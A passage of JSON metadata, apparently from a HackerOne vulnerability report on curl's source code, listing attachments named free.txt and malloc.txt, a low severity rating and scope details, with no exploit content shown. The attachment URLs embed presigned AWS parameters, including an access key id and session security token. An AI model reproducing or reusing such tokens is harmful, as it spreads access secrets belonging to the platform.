Z7bmOkHK9k6hi9dNb3WbdRdp9sXQAfHa2j2kcwS4tna7vgR%2BvcODJmFBVjnwa%2BEYWgVpZ50%2BFeLSbZ8Nwl5jgdGsF3uLZf48OpX6uVgSLaOfAYB1YqecEflpOosU9fF27v67N4OC2Z5leTj3dmoDww10f%2BAHqmw7chcliN3PSNMn%2F%2FjqPTrrWTjkZ04LwDD4pkw10Ivwc0kXPlLYyfFBt%2F%2B15gF3ZyE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8a38b4f958cec61ebeb158e4d24d1892e67f164bd7adfaa04ce397b11424be2c",
      "file_size": 239,
      "type": "application/octet-stream",
      "moderated": null
    },
    {
      "id": 5027151,
      "file_name": "free.txt",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ip3s7z2tdxpnc1g0p02kbss7vra7?response-content-disposition=attachment%3B%20filename%3D%22free.txt%22%3B%20filename%2A%3DUTF-8%27%27free.txt&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU7HFG7QO%2F20251123%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20251123T161508Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHcaCXVzLXdlc3QtMiJIMEYCIQDwX9h8RZDj6CCFNUGHFosynUKqB1AFr6Okk%2FfjcqrUDAIhAJ9iBeE4s%2B3ijFANNOfLlVRw0zVrzVdB7hoeROzgIT8JKrIFCEAQAxoMMDEzNjE5Mjc0ODQ5IgzLjnDnV4coCHIRSNoqjwUVur3%2F97nrtsqr6i%2FLNEAf%2FTVxp41GmUZnyZ5V0a9cJMKg9HeaZ%2BuHmVaQFJyLnWLW9eDYGo9Q9%2FpGiqwn7DoeJ9ng5%2BWf4LwuEbSYVTMO7r6PvnTkKOscgnfVwKWwNooq7tu1COV2ryVEpj8VyJRGHdyvxEy3hJt0is9Uwef56iAw7ObyYXmS4UZc0INV3s99jxrEjE0BT7fhI0qiO0oVAr3FI2vG%2Ftu8z8DR%2FoZ7vJyeVQCXEqDbmR6MW8zOfJKVidrl9ya36BJeEeZ7vLP019b5vK5X%2Bm5cStGDIdSwPYfFVqj6a5vD1nnO2Avj%2FUB1cTu7NG7sYeLGjAahk03zmqZl4s6OH6RnZX9kyFvyDaIJEiz7FJa44xc8wLTeSx9zBxONB9XU15cI2xI0Qj5tWFcyhxI4bodSdHRJxQvubuqxICbwVkdZlrh%2BK4b%2Bo%2B%2F970cFk1jAPlRlFiardi4XN8Rd4sKPuXIvOuiqgVdRjk4RFF9hH1TOAbJWzwKDDAazmdAYlzcml7lL8ctxY0DIxPtEmkv%2F1%2FU%2BEQkBaCRF514%2FgKTCYRrt%2B8asJTidcYPpMGQTEdARw0j262MBceNxsKUOCrH1cHBy3zBD6UlFM2mZ1L2xKykCurzQ3sxIZazMy3Kaq85Gd7UQchKd5q7yLqGHnVO7mWC2Kma9B8O9DEqXguxkbHQKJWqp0itS46VGeJ7wa4twod0ZuJLZTzfRisZP%2FrT4AYqoaAKOhDxwJ40kQ%2FnMXVcds9o%2F8VYK9SAAgR0OI8%2Bf4qRgGJmzNEYOl2Z%2B5xsp%2FQ69hSQa1XiJ8qYZAw9zk1r4wFQ2jZxfyVKkpJOezwFYXptplz8UK4FHjRIhZ37ZcpNqVXIEMJ0TMLS%2FjMkGOrAB%2BuZr4LBwtkD4Z7bmOkHK9k6hi9dNb3WbdRdp9sXQAfHa2j2kcwS4tna7vgR%2BvcODJmFBVjnwa%2BEYWgVpZ50%2BFeLSbZ8Nwl5jgdGsF3uLZf48OpX6uVgSLaOfAYB1YqecEflpOosU9fF27v67N4OC2Z5leTj3dmoDww10f%2BAHqmw7chcliN3PSNMn%2F%2FjqPTrrWTjkZ04LwDD4pkw10Ivwc0kXPlLYyfFBt%2F%2B15gF3ZyE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9a60192ab98d91909fe5accf764c613439989bb26f066188d09b7246d39ce1c8",
      "file_size": 100438,
      "type": "text/plain",
      "moderated": null
    },
    {
      "id": 5027152,
      "file_name": "malloc.txt",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/3jk8i0olr42uelp7h2eirlo6tb3v?response-content-disposition=attachment%3B%20filename%3D%22malloc.txt%22%3B%20filename%2A%3DUTF-8%27%27malloc.txt&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU7HFG7QO%2F20251123%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20251123T161508Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHcaCXVzLXdlc3QtMiJIMEYCIQDwX9h8RZDj6CCFNUGHFosynUKqB1AFr6Okk%2FfjcqrUDAIhAJ9iBeE4s%2B3ijFANNOfLlVRw0zVrzVdB7hoeROzgIT8JKrIFCEAQAxoMMDEzNjE5Mjc0ODQ5IgzLjnDnV4coCHIRSNoqjwUVur3%2F97nrtsqr6i%2FLNEAf%2FTVxp41GmUZnyZ5V0a9cJMKg9HeaZ%2BuHmVaQFJyLnWLW9eDYGo9Q9%2FpGiqwn7DoeJ9ng5%2BWf4LwuEbSYVTMO7r6PvnTkKOscgnfVwKWwNooq7tu1COV2ryVEpj8VyJRGHdyvxEy3hJt0is9Uwef56iAw7ObyYXmS4UZc0INV3s99jxrEjE0BT7fhI0qiO0oVAr3FI2vG%2Ftu8z8DR%2FoZ7vJyeVQCXEqDbmR6MW8zOfJKVidrl9ya36BJeEeZ7vLP019b5vK5X%2Bm5cStGDIdSwPYfFVqj6a5vD1nnO2Avj%2FUB1cTu7NG7sYeLGjAahk03zmqZl4s6OH6RnZX9kyFvyDaIJEiz7FJa44xc8wLTeSx9zBxONB9XU15cI2xI0Qj5tWFcyhxI4bodSdHRJxQvubuqxICbwVkdZlrh%2BK4b%2Bo%2B%2F970cFk1jAPlRlFiardi4XN8Rd4sKPuXIvOuiqgVdRjk4RFF9hH1TOAbJWzwKDDAazmdAYlzcml7lL8ctxY0DIxPtEmkv%2F1%2FU%2BEQkBaCRF514%2FgKTCYRrt%2B8asJTidcYPpMGQTEdARw0j262MBceNxsKUOCrH1cHBy3zBD6UlFM2mZ1L2xKykCurzQ3sxIZazMy3Kaq85Gd7UQchKd5q7yLqGHnVO7mWC2Kma9B8O9DEqXguxkbHQKJWqp0itS46VGeJ7wa4twod0ZuJLZTzfRisZP%2FrT4AYqoaAKOhDxwJ40kQ%2FnMXVcds9o%2F8VYK9SAAgR0OI8%2Bf4qRgGJmzNEYOl2Z%2B5xsp%2FQ69hSQa1XiJ8qYZAw9zk1r4wFQ2jZxfyVKkpJOezwFYXptplz8UK4FHjRIhZ37ZcpNqVXIEMJ0TMLS%2FjMkGOrAB%2BuZr4LBwtkD4Z7bmOkHK9k6hi9dNb3WbdRdp9sXQAfHa2j2kcwS4tna7vgR%2BvcODJmFBVjnwa%2BEYWgVpZ50%2BFeLSbZ8Nwl5jgdGsF3uLZf48OpX6uVgSLaOfAYB1YqecEflpOosU9fF27v67N4OC2Z5leTj3dmoDww10f%2BAHqmw7chcliN3PSNMn%2F%2FjqPTrrWTjkZ04LwDD4pkw10Ivwc0kXPlLYyfFBt%2F%2B15gF3ZyE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2b707f8c2e904295af6d99ffa1db2d16042b77d898e35cf612361bb7f44ec26f",
      "file_size": 286088,
      "type": "text/plain",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": null,
  "vote_count": 1,
  "voters": [
    "letshack9707"
  ],
  "severity": {
    "rating": "low",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 18844,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/curl/curl",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
